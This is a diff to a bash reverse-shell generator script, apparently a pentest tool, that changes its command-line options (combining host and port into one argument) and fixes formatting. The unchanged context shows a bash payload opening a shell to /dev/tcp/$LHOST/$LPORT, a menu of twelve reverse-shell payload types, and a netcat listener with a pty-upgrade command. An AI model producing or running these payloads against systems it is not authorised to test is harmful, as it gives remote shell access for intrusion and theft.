@@ -1,6 +1,6 @@
 #!/bin/bash
-# Autor: MrMidnight
-# Version: 1.2
+# Author: MrMidnight
+# Version: 1.4
 
 function bash_i_PAYLOAD() {
     echo "$UWUSHELL -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
@@ -170,10 +170,9 @@ EOF
 }
 
 function display_help() {
-    echo "Usage: $0 [-l|--lhost <lhost>] [-p|--lport <lport>] [-s|--shell <shell>] [-pl|--payload <1-12>] [-sp|--spawn] [-c|--copy] [--help]"
+    echo "Usage: $0 [-i|--ip <lhost:lport>] [-s|--shell <shell>] [-pl|--payload <1-12>] [-sp|--spawn] [-c|--copy] [--help]"
     echo -e "\nOptions:"
-    echo "  -l, --lhost    Local host"
-    echo "  -p, --lport    Local port"
+    echo "  -i, --ip       Local host and port (format: <lhost>:<lport>)"
     echo "  -s, --shell    Shell to use e.g.(/bin/bash)"
     echo "  -pl,--payload  PAYLOAD type (1-12)"
     echo "                 1) Bash-i"
@@ -190,7 +189,7 @@ function display_help() {
     echo "                 12) PHP Pentest Monkey"
     echo "  -sp, --spawn   Spawn a netcat listener on LPORT"
     echo "  -c, --copy     Copy generated shell command to clipboard"
-    echo "  -h, --help         Display this help message"
+    echo "  -h, --help     Display this help message"
     exit 0
 }
 
@@ -200,8 +199,9 @@ fi
 
 while [[ "$#" -gt 0 ]]; do
     case $1 in
-        -l|--lhost) LHOST=$2; shift ;;
-        -p|--lport) LPORT=$2; shift ;;
+        -i|--ip)
+            IFS=':' read -r LHOST LPORT <<< "$2"
+            shift ;;
         -s|--shell) SHELL=$2; UWUSHELL=$2; shift ;;
         -pl|--payload) PAYLOAD=$2; shift ;;
         -sp|--spawn) SPAWN=true ;;
@@ -213,7 +213,7 @@ while [[ "$#" -gt 0 ]]; do
 done
 
 if [[ -z $LHOST || -z $LPORT || -z $PAYLOAD || -z $UWUSHELL ]]; then
-    echo "Usage: $0 [-l|--lhost <lhost>] [-p|--lport <lport>] [-s|--shell <shell>] [-pl|--payload <1-12>] [-sp|--spawn] [-c|--copy] [--help]"
+    echo "Usage: $0 [-i|--ip <lhost:lport>] [-s|--shell <shell>] [-pl|--payload <1-12>] [-sp|--spawn] [-c|--copy] [--help]"
     exit 1
 fi
 
@@ -244,7 +244,8 @@ main() {
     fi
 
     if [ "$SPAWN" == true ]; then
-            stty raw -echo; (echo 'python3 -c "import pty;pty.spawn(\"$UWUSHELL\")" || python -c "import pty;pty.spawn(\"$UWUSHELL\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | nc -lvnp $LPORT && reset
-        fi
+        stty raw -echo; (echo 'python3 -c "import pty;pty.spawn(\"$UWUSHELL\")" || python -c "import pty;pty.spawn(\"$UWUSHELL\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | nc -lvnp $LPORT && reset
+    fi
 }
+
 main
